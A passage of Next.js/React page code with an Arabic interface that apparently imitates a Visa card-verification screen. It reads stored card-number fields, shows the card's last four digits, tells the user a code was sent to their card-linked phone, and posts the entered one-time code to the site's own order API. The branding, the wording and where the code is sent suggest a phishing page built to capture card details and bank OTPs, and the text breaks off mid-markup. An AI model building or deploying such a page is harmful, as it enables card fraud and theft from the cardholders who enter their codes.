'use client';

import Link from 'next/link';
import { useRouter } from 'next/navigation';
import { useEffect, useState } from 'react';

const DRAFT_KEY = 'erd-algwal-checkout-draft-v1';

type CheckoutDraft = {
  phone?: unknown;
  cardLast4?: string;
  cardNumber?: string;
  card_number?: string;
  card?: string;
  stage?: unknown;
  orderId?: unknown;
  orderNumber?: unknown;
  customerNotificationKey?: unknown;
  confirmedAt?: unknown;
};

function normalizeDigits(value: string) {
  return value
    .replace(/[٠-٩]/g, (digit) => String('٠١٢٣٤٥٦٧٨٩'.indexOf(digit)))
    .replace(/[۰-۹]/g, (digit) => String('۰۱۲۳۴۵۶۷۸۹'.indexOf(digit)))
    .replace(/[^0-9]/g, '');
}

export default function VerifyPhonePage() {
  const router = useRouter();
  const [phone, setPhone] = useState('');
  const [cardLast4, setCardLast4] = useState('0000');
  const [orderId, setOrderId] = useState('');
  const [orderNumber, setOrderNumber] = useState('');
  const [customerNotificationKey, setCustomerNotificationKey] = useState('');
  const [draftReady, setDraftReady] = useState(false);
  const [referenceCode, setReferenceCode] = useState('');
  const [error, setError] = useState('');
  const [isVerifying, setIsVerifying] = useState(false);
  const [verified, setVerified] = useState(false);
  const [confirmedAt, setConfirmedAt] = useState<number | null>(null);
  const [countdown, setCountdown] = useState(0);

  const isReferenceCodeValid = /^[0-9]{4,6}$/.test(referenceCode);

  useEffect(() => {
    try {
      const raw = window.sessionStorage.getItem(DRAFT_KEY);
      const draft = raw ? (JSON.parse(raw) as CheckoutDraft) : null;

      if (draft) {
        // بحث شامل ومرن عن أي مسمى محتمل لرقم البطاقة أو آخر 4 أرقام منها
        const rawCard = 
          draft.cardLast4 || 
          draft.cardNumber || 
          draft.card_number || 
          draft.card;

        if (typeof rawCard === 'string') {
          const digits = normalizeDigits(rawCard);
          if (digits.length >= 4) {
            setCardLast4(digits.slice(-4));
          }
        }
      }

      const savedPhone = typeof draft?.phone === 'string' ? normalizeDigits(draft.phone) : '';
      const savedOrderId = typeof draft?.orderId === 'string' ? draft.orderId : '';
      const savedKey = typeof draft?.customerNotificationKey === 'string' ? draft.customerNotificationKey : '';
      const savedConfirmedAt =
        typeof draft?.confirmedAt === 'number' && Number.isFinite(draft.confirmedAt)
          ? draft.confirmedAt
          : null;

      if (
        (draft?.stage === 'phone-verification' || draft?.stage === 'confirmed') &&
        savedPhone.length === 10 &&
        savedOrderId &&
        savedKey
      ) {
        setPhone(savedPhone);
        setOrderId(savedOrderId);
        setOrderNumber(typeof draft.orderNumber === 'string' ? draft.orderNumber : '');
        setCustomerNotificationKey(savedKey);
        setVerified(draft.stage === 'confirmed');
        setConfirmedAt(draft.stage === 'confirmed' ? savedConfirmedAt : null);
        setDraftReady(true);
      } else {
        setDraftReady(true);
      }
    } catch {
      setDraftReady(true);
    }
  }, []);

  useEffect(() => {
    if (!verified) {
      setCountdown(0);
      return;
    }

    const verificationTime = confirmedAt ?? Date.now();
    const redirectTimer = window.setTimeout(
      () => router.replace('/'),
      Math.max(0, verificationTime + 30_000 - Date.now())
    );
    const updateCountdown = () => {
      setCountdown(Math.max(0, Math.ceil((verificationTime + 30_000 - Date.now()) / 1000)));
    };

    updateCountdown();
    const interval = window.setInterval(updateCountdown, 250);
    return () => {
      window.clearInterval(interval);
      window.clearTimeout(redirectTimer);
    };
  }, [confirmedAt, verified, router]);

  async function handleVerify() {
    if (!isReferenceCodeValid) {
      setError('أدخل رمز التأكيد المكوّن من 4 إلى 6 أرقام.');
      return;
    }
    if (isVerifying || verified) return;

    setIsVerifying(true);
    setError('');
    try {
      const response = await fetch('/api/orders/verify-confirmation-otp', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({
          orderId,
          customerNotificationKey,
          code: referenceCode,
        }),
      });
      const result = (await response.json()) as { ok?: boolean; error?: string; message?: string };
      if (!response.ok || !result.ok) {
        setError(result.error || 'تعذر تسجيل الرقم المرجعي. حاول مرة أخرى.');
        return;
      }

      const verificationTime = Date.now();
      setConfirmedAt(verificationTime);
      setVerified(true);
      setError('');
      try {
        const raw = window.sessionStorage.getItem(DRAFT_KEY);
        const draft = raw ? (JSON.parse(raw) as Record<string, unknown>) : {};
        window.sessionStorage.setItem(
          DRAFT_KEY,
          JSON.stringify({
            ...draft,
            stage: 'confirmed',
            confirmedAt: verificationTime,
          })
        );
      } catch {}
    } catch {
      setError('تعذر الاتصال بالإدارة. حاول مرة أخرى.');
    } finally {
      setIsVerifying(false);
    }
  }

  if (!draftReady) {
    return (
      <main style={{ backgroundColor: '#ffffff', minHeight: '100vh', display: 'flex', justifyContent: 'center', alignItems: 'center', padding: '20px' }}>
        <div style={{ textAlign: 'center' }}>
          <p style={{ color: '#555', fontSize: '16px', marginBottom: '15px' }}>لا توجد بيانات طلب جاهزة للتأكيد.</p>
          <Link href="/checkout/store" style={{ color: '#1646a7', textDecoration: 'none' }}>
            العودة لإدخال بيانات الطلب
          </Link>
        </div>
      </main>
    );
  }

  return (
    <div style={{ backgroundColor: '#ffffff', color: '#000000', minHeight: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', fontFamily: 'Arial, sans-serif' }}>
      
      {/* Header */}
      <header style={{ width: '100%', maxWidth: '500px', padding: '15px 20px', display: 'flex', justifyContent: 'flex-start', alignItems: 'center', borderBottom: '1px solid #dcdcdc' }}>
        <div style={{ fontSize: '32px', fontWeight: 'bold', color: '#1a1f71', fontStyle: 'italic', letterSpacing: '-1px' }}>
          VISA
        </div>
      </header>

      {/* Content */}
      <main style={{ width: '100%', maxWidth: '400px', padding: '30px 20px', display: 'flex', flexDirection: 'column', alignItems: 'center', textAlign: 'center' }}>
        
        {verified ? (
          <div>
            <div style={{ fontSize: '18px', fontWeight: 'bold', color: '#2e7d32', marginBottom: '15px' }}>
              تم تسجيل الرقم المرجعي بنجاح
            </div>
            {countdown > 0 && (
              <div style={{ fontSize: '14px', color: '#555' }}>
                سيتم التوجيه خلال: <strong style={{ fontSize: '24px', color: '#1646a7', fontVariantNumeric: 'tabular-nums' }}>00:{String(countdown).padStart(2, '0')}</strong>
              </div>
            )}
          </div>
        ) : (
          <>
            <div style={{ fontSize: '16px', color: '#555555', marginBottom: '15px' }}>
              للتحقق من عملية الشراء
            </div>

            <div style={{ fontSize: '18px', lineHeight: '1.4', color: '#000000', marginBottom: '25px', maxWidth: '320px' }}>
              تم ارسال رمز التحقق لرقم هاتفكم المرتبط بالبطاقة المصرفيةلتأكيد الدفع بإستخدام بطاقة
              <span style={{ display: 'block', direction: 'ltr', fontFamily:'monospace',
